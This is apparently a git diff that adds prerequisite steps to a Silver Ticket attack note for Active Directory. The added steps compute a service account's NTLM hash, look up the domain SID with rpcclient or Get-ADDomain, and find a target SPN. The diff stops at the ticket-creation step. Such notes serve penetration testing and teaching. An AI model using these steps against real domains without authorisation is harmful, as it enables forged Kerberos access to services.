@@ -1,5 +1,37 @@
 # Silver Ticket
 
+## Requirements:
+
+### 1) SPN password NTLM hash 
+
+https://www.browserling.com/tools/ntlm-hash
+
+OR Use this Python one-liner instead
+
+    python3 -c "from passlib.hash import nthash; print(nthash.hash('YourPassword'))"
+
+Another one-liner
+
+    echo -n 'YourPassword' | iconv -t UTF-16LE | openssl md4
+
+### 2) Domain SID
+
+Windows
+
+    Get-ADDomain
+
+Linux
+
+    rpcclient -U "user.name" -c "lsaquery" IP
+
+### 3) Target SPN (mssql/domain.local)
+
+Windows
+
+    Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+
+## Steps:
+
 ### 1) Create ST
 
 /rc4 take the service account (generally the machine account) hash. /aes128 or /aes256 can be used for AES keys.
